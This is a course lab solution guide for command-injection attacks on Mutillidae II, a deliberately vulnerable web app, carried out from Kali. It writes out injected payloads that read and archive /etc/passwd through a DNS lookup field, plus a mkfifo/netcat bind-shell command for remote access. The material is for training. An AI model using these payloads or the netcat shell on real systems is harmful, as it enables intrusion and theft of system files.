## Solution Guide: Command Injection

In this activity, you performed a command injection chaining attack. This kind of practice will help you better understand the attack process so you can be better prepared to defend against it. 

---

Launch the following environments:

- Attacker: Kali Linux
   - Username: `root`
   - Password: `toor`

- Vulnerable Web Server: owaspbwa
   - Mutillidae II


1. In the owaspbwa machine, identify the local IP:

   - Run `ifconfig` to retrieve the local IP of the owaspbwa VM. Or, find the IP from the welcome message in the terminal window of the owaspbwa machine.

2. In Kali, open Firefox and type the IP of the owaspbwa VM into the URL. Navigate to the DNS Lookup page:

   - OWASP 2013 > A1 Injection Other > Command Injection > Other > DNS Lookup

   - Set security level to **Hosed**.

3. Enter the following command to reveal the contents of the `/etc/passwd` file in the **Hostname/IP** box:

   -  `172.16.203.141; cat /etc/passwd`

4. Enter the following command to create a file called `hack.txt` that contains the contents of the `/etc/passwd` file, and then archive and compress it:
   
   - `172.16.203.141; cat /etc/passwd > /tmp/hack.txt; tar czf /tmp/hack.txt.gz /tmp/hack.txt`
   
#### Bonus

Navigate to owaspbwa (the vulnerable web server) > Mutillidae II > OWASP 2013 > A1 Injection (Other) > Command Injection > DNS Lookup

Use the following steps to perform a command injection that allows you to exfiltrate a list of users from the vulnerable web server (owaspbwa) to the attacker's machine (Kali) in a test file named `hacked.txt`.

   - Establish a listener on the vulnerable web server: 
   
       - `172.16.203.141;mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe`
   
   - In the terminal, type the command that connects to the listener on the web server.
   
       - `nc 172.16.203.141 4444`
   
   - Type the command that copies the `/etc/passwd` into a text document called `hacked.txt`.
   
       - `cat /etc/passwd > /tmp/hacked.txt`
   
   - Type the command that reads the contents of `hacked.txt`.
   
       - `cat /tmp/hacked.txt`
   
   What results were returned?
   
   - The contents of the `/etc/passwd` file.

---

© 2020 Trilogy Education Services, a 2U, Inc. brand. All Rights Reserved.  
